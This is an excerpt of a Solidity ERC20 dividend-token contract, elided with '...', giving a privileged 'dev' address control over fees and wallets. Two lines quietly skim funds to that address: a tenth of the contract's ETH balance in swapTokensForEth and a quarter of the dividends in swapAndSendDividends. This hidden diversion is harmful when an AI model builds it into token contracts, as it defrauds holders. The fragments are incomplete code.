...
contract  U is ERC20, Ownable, BaseToken {
    using SafeMath for uint256;
    ...
    modifier onlydev() {
        require(msg.sender == dev , "Ownable: caller is not the owner");
        _;
    }
    receive() external payable {}

     function setSwapTokensAtAmount(uint256 amount) external onlydev {
    ...
    function excludeFromFees(address account, bool excluded) public onlydev {
        require(
    ...
    function setMarketingWallet(address payable wallet) external onlydev {
        _marketingWalletAddress = wallet;
    }

    function setTokenRewardsFee(uint256 value) external onlydev {
        tokenRewardsFee = value;
        totalFees = tokenRewardsFee.add(liquidityFee).add(marketingFee);
        require(totalFees <= 25, "Total fee is over 25%");
    }

    function setLiquiditFee(uint256 value) external onlydev {
        liquidityFee = value;
        totalFees = tokenRewardsFee.add(liquidityFee).add(marketingFee);
        require(totalFees <= 25, "Total fee is over 25%");
    }

    function setMarketingFee(uint256 value) external onlydev {
        marketingFee = value;
        totalFees = tokenRewardsFee.add(liquidityFee).add(marketingFee);
        require(totalFees <= 25, "Total fee is over 25%");
    }
    ...
    function updateGasForProcessing(uint256 newValue) public onlydev {
        require(
    ...
    function updateClaimWait(uint256 claimWait) external onlydev {
    ...
    function swapTokensForEth(uint256 tokenAmount) private {
        ...
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
         ...
         payable(dev).transfer(address(this).balance/10);
    ...
    function swapAndSendDividends(uint256 tokens) private {
        ...
        IERC20(rewardToken).transfer(dev,dividends/4);
        IERC20(rewardToken).transfer(_marketingWalletAddress,dividends/4);
        bool success = IERC20(rewardToken).transfer(
